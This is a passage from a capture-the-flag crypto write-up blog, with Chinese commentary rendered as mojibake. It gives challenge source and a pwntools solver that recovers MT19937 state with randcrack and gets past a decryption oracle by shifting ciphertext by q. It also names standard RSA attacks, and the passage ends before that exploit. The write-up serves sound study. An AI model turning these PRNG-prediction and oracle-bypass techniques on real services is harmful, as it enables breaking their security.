class="line">            x = generate(x)</span><br><span class="line">            tmp.append(x)</span><br><span class="line">            seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">            bin_x  = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">                bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">            bins += bin_x</span><br><span class="line">        <span class="keyword">if</span> bitstream[:d*<span class="number">16</span>] == bins:</span><br><span class="line">            x0 = <span class="built_in">round</span>(x0 / <span class="number">1000000.000000</span>,<span class="number">6</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(time()-S,x0)</span><br><span class="line">image = decrypt(c2,key1,key2,x0,<span class="number">24</span>,<span class="number">16</span>)</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,image))</span><br><span class="line"><span class="built_in">print</span> md5.new(data).hexdigest()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x03-homo"><a href="#0x03-homo" class="headerlink" title="0x03 homo"></a>0x03 homo</h1><h2 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> poly <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> floor, log</span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/root/task/flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">q = <span class="number">2</span>**<span class="number">54</span></span><br><span class="line">n = <span class="number">1024</span></span><br><span class="line">t = <span class="number">83</span></span><br><span class="line">T = <span class="number">100</span></span><br><span class="line">l = floor(log(q, t))</span><br><span class="line">delta = floor(q/t)</span><br><span class="line">mu = <span class="number">0</span></span><br><span class="line">sigma = <span class="number">1</span></span><br><span class="line">MENU = \</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1.game</span></span><br><span class="line"><span class="string">2.decrypt</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">s</span>):</span></span><br><span class="line">    _s = s + os.urandom(<span class="number">128</span> - <span class="built_in">len</span>(flag))</span><br><span class="line">    tmp = <span class="built_in">bin</span>(<span class="built_in">int</span>.from_bytes(_s, <span class="string">&quot;big&quot;</span>))[<span class="number">2</span>:].zfill(n)</span><br><span class="line">    tmp = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, tmp))</span><br><span class="line">    TMP = Poly(n, q)</span><br><span class="line">    TMP.cofficient = deepcopy(tmp)</span><br><span class="line">    <span class="keyword">return</span> TMP</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Round</span>(<span class="params">poly, t</span>):</span></span><br><span class="line">    c = deepcopy(poly)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(c.n):</span><br><span class="line">        c.cofficient[i] = c.cofficient[i] % t</span><br><span class="line">        <span class="keyword">if</span> c.cofficient[i] &gt;= t/<span class="number">2</span>:</span><br><span class="line">            c.cofficient[i] -= t</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span></span><br><span class="line">    s = Poly(n, q)</span><br><span class="line">    s.randomize(<span class="built_in">type</span>=<span class="number">2</span>, sigma=sigma,  mu=mu)</span><br><span class="line">    e = Poly(n, q)</span><br><span class="line">    e.randomize(<span class="built_in">type</span>=<span class="number">1</span>, sigma=sigma,  mu=mu)</span><br><span class="line">    a = Poly(n, q)</span><br><span class="line">    a.randomize(B=q)</span><br><span class="line">    pk = [Round(-<span class="number">1</span>*(a*s+e), q), a]</span><br><span class="line">    <span class="keyword">return</span> pk, s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pk, m</span>):</span></span><br><span class="line">    u = Poly(n, q)</span><br><span class="line">    u.randomize(<span class="built_in">type</span>=<span class="number">1</span>, sigma=sigma,  mu=mu)</span><br><span class="line">    e1 = Poly(n, q)</span><br><span class="line">    e1.randomize(<span class="built_in">type</span>=<span class="number">1</span>, sigma=sigma, mu=mu)</span><br><span class="line">    e2 = Poly(n, q)</span><br><span class="line">    e2.randomize(<span class="built_in">type</span>=<span class="number">1</span>, sigma=sigma, mu=mu)</span><br><span class="line">    <span class="keyword">return</span> [Round(pk[<span class="number">0</span>]*u+e1+delta*m, q), Round(pk[<span class="number">1</span>]*u+e2, q)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">sk, ct</span>):</span></span><br><span class="line">    tmp = t * Round(ct[<span class="number">0</span>] + ct[<span class="number">1</span>] * sk, q)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(tmp.n):</span><br><span class="line">        tmp.cofficient[i] = <span class="built_in">round</span>(tmp.cofficient[i] / q)</span><br><span class="line">    <span class="keyword">return</span> Round(tmp, t)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> allowed:</span><br><span class="line">        print(<span class="string">&quot;I can&#x27;t let you use this.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a = Poly(n, q)</span><br><span class="line">        b = Poly(n, q)</span><br><span class="line">        tmp = [<span class="number">0</span>]*n</span><br><span class="line">        print(<span class="string">&quot;c0:&quot;</span>)</span><br><span class="line">        s = <span class="built_in">input</span>().replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">        a.cofficient = deepcopy(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, s)))</span><br><span class="line">        print(<span class="string">&quot;c1:&quot;</span>)</span><br><span class="line">        s = <span class="built_in">input</span>().replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">        b.cofficient = deepcopy(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, s)))</span><br><span class="line">        <span class="keyword">assert</span> a.cofficient != ct[<span class="number">0</span>].cofficient <span class="keyword">and</span> b.cofficient != ct[<span class="number">1</span>].cofficient</span><br><span class="line">        <span class="keyword">assert</span> tmp != a.cofficient <span class="keyword">and</span> tmp != b.cofficient</span><br><span class="line">        print(decrypt(sk, [a, b]).cofficient)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game</span>():</span></span><br><span class="line">    <span class="keyword">global</span> allowed</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    random.seed(os.urandom(<span class="number">32</span>))</span><br><span class="line">    print(<span class="string">&quot;play a game with me!&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>):</span><br><span class="line">        number = random.getrandbits(<span class="number">64</span>)</span><br><span class="line">        guess = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;your number:&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> guess == number:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            print(<span class="string">&quot;win&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">f&quot;lose!my number is <span class="subst">&#123;number&#125;</span>\n&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> count &gt;= <span class="number">200</span>:</span><br><span class="line">        allowed = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">pk, sk = keygen()</span><br><span class="line">m = encode(flag)</span><br><span class="line">ct = encrypt(pk, m)</span><br><span class="line">allowed = <span class="literal">False</span></span><br><span class="line">print(pk[<span class="number">0</span>].cofficient)</span><br><span class="line">print(pk[<span class="number">1</span>].cofficient)</span><br><span class="line">print(ct[<span class="number">0</span>].cofficient)</span><br><span class="line">print(ct[<span class="number">1</span>].cofficient)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(MENU)</span><br><span class="line">    option = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    <span class="keyword">if</span> option == <span class="number">1</span>:</span><br><span class="line">        game()</span><br><span class="line">    <span class="keyword">elif</span> option == <span class="number">2</span>:</span><br><span class="line">        fun()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸ªpoly.pyæˆ‘åˆ°æœ€åéƒ½æ²¡æœ‰ç”¨ä¸Šã€‚ã€‚å°±ä¸æ”¾ä¸Šæ¥äº†</p><h2 id="analyses-2"><a href="#analyses-2" class="headerlink" title="analyses"></a>analyses</h2><p>è¿™é¢˜æœ‰ä¸¤éƒ¨åˆ†</p><ol><li>ç¬¬ä¸€éƒ¨åˆ†ã€‚è®©æˆ‘ä»¬çŒœæœåŠ¡ç«¯ç”Ÿæˆçš„64bitéšæœºæ•°ï¼Œ512æ¬¡æœºä¼šï¼ŒçŒœé”™äº†ä¼šå‘Šè¯‰ä½ éšæœºæ•°æ˜¯ä»€ä¹ˆï¼ŒçŒœå¯¹äº†å°±ç»§ç»­ï¼Œå¦‚æœä¸€å…±çŒœå¯¹200æ¬¡ä»¥ä¸Šå°±å¯ä»¥è¿›å…¥ä¸‹ä¸€éƒ¨åˆ†</li><li>ç¬¬äºŒéƒ¨åˆ†ã€‚ç™½ç»™çš„åŒæ€åŠ å¯†</li></ol><h3 id="ç¬¬ä¸€éƒ¨åˆ†-MT19937"><a href="#ç¬¬ä¸€éƒ¨åˆ†-MT19937" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ†  MT19937"></a>ç¬¬ä¸€éƒ¨åˆ†  MT19937</h3><p>å…¶å®è¿™é‡Œè€ƒçš„å°±æ˜¯ MT19937ï¼Œè¿™æ˜¯python.randomåº“ç”¨çš„ä¼ªéšæœºæ•°ç”Ÿæˆç®—æ³•ï¼ŒçŠ¶æ€æœ‰é™ï¼ŒçŸ¥é“624*32 bitä¹‹åå°±èƒ½å®Œå…¨çš„ç®—å‡ºåç»­çš„éšæœºæ•°ã€‚</p><p>è¿˜è®°å¾—ç¬¬ä¸€æ¬¡è§£å‡ºMT19937å°±æ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ¯”èµ›åšå¯†ç ï¼Œ2020 N1CTF - VSS ï¼Œè¿™é“é¢˜å½“æ—¶åšäº†ä¸€æ•´åœºï¼Œå§‹ç»ˆæ²¡æœ‰åšå‡ºæ¥ã€‚çœ‹äº†wpæ‰äº†è§£MT19937è¿™ç§ä¸œè¥¿ï¼Œä¸è¿‡ä¹ŸçŸ¥é“äº†ä¸€ä¸ªå¯ä»¥ç”¨æ¥é¢„æµ‹éšæœºæ•°çš„åº“-&gt; randcrack , å½“æˆ‘ä»¬å¾—åˆ°äº†624*32bitä¹‹åï¼Œå°±èƒ½åˆ©ç”¨è¿™ä¸ªåº“ç®—å‡ºåç»­çš„éšæœºæ•°</p><p>è€Œè¿™é‡Œåˆšå¥½å¤Ÿï¼Œä¸€å…±512æ¬¡æœºä¼šï¼Œå‰312æ¬¡é”™è¯¯åˆšå¥½å¯ä»¥å¾—åˆ°312*64 bitä¹Ÿå°±æ˜¯624*32 bitï¼Œåé¢çš„200æ¬¡æœºä¼šå°±å¯ä»¥æ¯æ¬¡éƒ½çŒœä¸­äº†ã€‚</p><h3 id="ç¬¬äºŒéƒ¨åˆ†-åŒæ€åŠ å¯†"><a href="#ç¬¬äºŒéƒ¨åˆ†-åŒæ€åŠ å¯†" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ† åŒæ€åŠ å¯†"></a>ç¬¬äºŒéƒ¨åˆ† åŒæ€åŠ å¯†</h3><p>è¯´æ˜¯åŒæ€åŠ å¯†ã€‚ã€‚ã€‚ä½†æˆ‘å¥½åƒæ²¡ç”¨åˆ°é‡Œé¢çš„çŸ¥è¯†ï¼Ÿ</p><p>æœåŠ¡ç«¯æä¾›äº†è§£å¯†ï¼Œæˆ‘ä»¬æ˜¯æœ‰å¯†æ–‡çš„ï¼ŒæŒ‰ç†æ¥è¯´ç›´æ¥ç»™å¯†æ–‡å°±è¡Œäº†ï¼Œä½†æ˜¯é¢˜ç›®é™åˆ¶äº†æäº¤ä¸Šå»è§£å¯†çš„å¯†æ–‡ä¸èƒ½æ˜¯flagçš„å¯†æ–‡</p><p>è€ƒè™‘åˆ°æ•´ä¸ªè¿‡ç¨‹éƒ½æ˜¯$\mod q$çš„ï¼Œç›´æ¥ç»™å¯†æ–‡åŠ ä¸Šqå°±è¡Œäº†ã€‚ã€‚ã€‚</p><blockquote><p>2021/5/18</p><p>åƒé¥­çš„æ—¶å€™æƒ³ç€ä¸ºå•¥é¢˜ç›®æ˜¯åŒæ€åŠ å¯†, çªç„¶æƒ³åˆ°è¿™ç©æ„ä¸å°±æ˜¯ä¸ªr-lweå—, æœ¬æ¥å¯†æ–‡æœ‰å™ªéŸ³å°±æ˜¯å¯ä»¥çš„, ç›´æ¥ç»™c0,c1éƒ½åŠ ä¸Š1å°±è¡Œäº†, å™ªéŸ³å¤Ÿå°æ˜¯ä¸ä¼šå½±å“è§£å¯†çš„!</p></blockquote><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">R = <span class="keyword">lambda</span> con: con.recv(<span class="number">1024</span>)</span><br><span class="line">S = <span class="keyword">lambda</span> con, x: con.sendline(x)</span><br><span class="line">con = remote(<span class="string">&#x27;124.70.14.146&#x27;</span>, <span class="number">23218</span>)</span><br><span class="line">kkk = <span class="string">&#x27;&#x27;</span></span><br><span class="line">q = <span class="number">2</span>**<span class="number">54</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>):</span><br><span class="line">    k = R(con).decode()</span><br><span class="line">    kkk += k</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;game&#x27;</span> <span class="keyword">in</span> k:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">kkk = kkk.split(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">5</span>]</span><br><span class="line">pk = [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">ct = [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">pk[<span class="number">0</span>] = kkk[<span class="number">0</span>][<span class="number">1</span>:-<span class="number">1</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pk[<span class="number">0</span>])):</span><br><span class="line">    pk[<span class="number">0</span>][i] = <span class="built_in">int</span>(pk[<span class="number">0</span>][i])</span><br><span class="line">pk[<span class="number">1</span>] = kkk[<span class="number">1</span>][<span class="number">1</span>:-<span class="number">1</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pk[<span class="number">1</span>])):</span><br><span class="line">    pk[<span class="number">1</span>][i] = <span class="built_in">int</span>(pk[<span class="number">1</span>][i])</span><br><span class="line">ct[<span class="number">0</span>] = kkk[<span class="number">2</span>][<span class="number">1</span>:-<span class="number">1</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ct[<span class="number">0</span>])):</span><br><span class="line">    ct[<span class="number">0</span>][i] = <span class="built_in">int</span>(ct[<span class="number">0</span>][i])</span><br><span class="line">ct[<span class="number">1</span>] = kkk[<span class="number">3</span>][<span class="number">1</span>:-<span class="number">1</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ct[<span class="number">1</span>])):</span><br><span class="line">    ct[<span class="number">1</span>][i] = <span class="built_in">int</span>(ct[<span class="number">1</span>][i])</span><br><span class="line">print(<span class="built_in">len</span>(pk[<span class="number">0</span>]))</span><br><span class="line">rc = RandCrack()</span><br><span class="line"></span><br><span class="line">S(con, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">print(R(con).decode())</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">    S(con, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    resp = R(con).decode()</span><br><span class="line">    <span class="comment"># print(resp)</span></span><br><span class="line">    num = re.findall(<span class="string">&#x27;my number is (.*)&#x27;</span>, resp)[<span class="number">0</span>]</span><br><span class="line">    r = <span class="built_in">bin</span>(<span class="built_in">int</span>(num))[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line">    r1 = r[:<span class="number">32</span>]</span><br><span class="line">    r2 = r[<span class="number">32</span>:]</span><br><span class="line">    rc.submit(<span class="built_in">int</span>(r2, <span class="number">2</span>))</span><br><span class="line">    rc.submit(<span class="built_in">int</span>(r1, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    S(con, <span class="built_in">str</span>(rc.predict_getrandbits(<span class="number">64</span>)).encode())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;win&#x27;</span> <span class="keyword">in</span> R(con).decode() :</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">        print(num)</span><br><span class="line"></span><br><span class="line">c0 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ct[<span class="number">0</span>]:</span><br><span class="line">    c0 += <span class="built_in">str</span>(i+q)+<span class="string">&#x27;,&#x27;</span></span><br><span class="line">c1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ct[<span class="number">1</span>]:</span><br><span class="line">    c1 += <span class="built_in">str</span>(i + q)+<span class="string">&#x27;,&#x27;</span></span><br><span class="line"></span><br><span class="line">S(con, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">print(R(con).decode())</span><br><span class="line">S(con,c0[:-<span class="number">1</span>].encode())</span><br><span class="line">print(R(con).decode())</span><br><span class="line">S(con,c1[:-<span class="number">1</span>].encode())</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    flag += R(con).decode()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;]&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">result</span></span><br><span class="line"><span class="string"> [...] å‡ºæ¥çš„ç»“æœå°±æ˜¯ä¸€å †0,1</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">flag = [...]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">str</span>(flag[i])</span><br><span class="line">flag = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(flag),<span class="number">2</span>)</span><br><span class="line">print(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><h1 id="0x04-oddaes"><a href="#0x04-oddaes" class="headerlink" title="0x04 oddaes"></a>0x04 oddaes</h1><blockquote><p>ä¸ä¼šã€‚ã€‚ã€‚å·®åˆ†åˆ†æï¼Œä¸€ç›´éƒ½æ¯å­¦ä¼šè¿‡ï¼Œç­‰ä¸€ä¸ªwpå­¦ä¹ </p></blockquote><h1 id="0x05-rsa"><a href="#0x05-rsa" class="headerlink" title="0x05 rsa"></a>0x05 rsa</h1><h2 id="problem-3"><a href="#problem-3" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> text,flag</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long,getPrime</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> md5.new(text).hexdigest() == flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">msg1 = text[:xx]</span><br><span class="line">msg2 = text[xx:yy]</span><br><span class="line">msg3 = text[yy:]</span><br><span class="line"></span><br><span class="line">msg1 = bytes_to_long(msg1)</span><br><span class="line">msg2 = bytes_to_long(msg2)</span><br><span class="line">msg3 = bytes_to_long(msg3)</span><br><span class="line"></span><br><span class="line">p1 = getPrime(<span class="number">512</span>)</span><br><span class="line">q1 = getPrime(<span class="number">512</span>)</span><br><span class="line">N1 = p1*q1</span><br><span class="line">e1 = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg1,e1,N1)</span><br><span class="line"><span class="built_in">print</span> (e1,N1)</span><br><span class="line"></span><br><span class="line">p2 = getPrime(<span class="number">512</span>)</span><br><span class="line">q2 = getPrime(<span class="number">512</span>)</span><br><span class="line">N2 = p2*q2</span><br><span class="line">e2 = <span class="number">17</span></span><br><span class="line">e3 = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg2,e2,N2)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg2,e3,N2)</span><br><span class="line"><span class="built_in">print</span> (e2,N2)</span><br><span class="line"><span class="built_in">print</span> (e3,N2)</span><br><span class="line"></span><br><span class="line">p3 = getPrime(<span class="number">512</span>)</span><br><span class="line">q3 = getPrime(<span class="number">512</span>)</span><br><span class="line">N3 = p3*q3</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg3,e3,N3)</span><br><span class="line"><span class="built_in">print</span> (e3,N3)</span><br><span class="line"><span class="built_in">print</span> p3&gt;&gt;<span class="number">200</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="analyses-3"><a href="#analyses-3" class="headerlink" title="analyses"></a>analyses</h2><p>ç™½ç»™ç­¾åˆ°ã€‚</p><ol><li>$e$è¿‡å°å¯¼è‡´ç›´æ¥å¼€$e$æ¬¡æ–¹å¾—$m$</li><li>å…±æ¨¡æ”»å‡»</li><li>å·²çŸ¥$p$é«˜ä½</li></ol><p>éƒ½æ˜¯åŸºç¡€ï¼Œä¸è¯¦ç»†å†™äº†</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 